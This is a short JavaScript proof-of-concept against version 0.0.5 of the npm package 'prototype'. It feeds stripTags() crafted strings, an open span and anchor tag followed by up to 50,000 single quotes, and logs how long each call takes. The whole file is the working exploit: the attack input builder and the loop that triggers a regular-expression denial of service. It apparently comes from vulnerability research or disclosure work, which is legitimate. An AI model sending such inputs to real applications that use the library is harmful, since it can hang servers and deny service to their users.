/**
 * prototype@0.0.5
 * It allows cause a denial of service when stripping crafted tags.
 */
var prototype = require("prototype/lib/String")
function build_attack(n) {
	var ret = "hello <span> <a "
	for (var i = 0; i < n; i++) {
		ret += "'"
	}

	return ret+"!";
}

for(var i = 1; i <= 50000; i++) {
    var time = Date.now();
    var attack_str = build_attack(i)
    attack_str.stripTags()
    var time_cost = Date.now() - time;
    console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
}
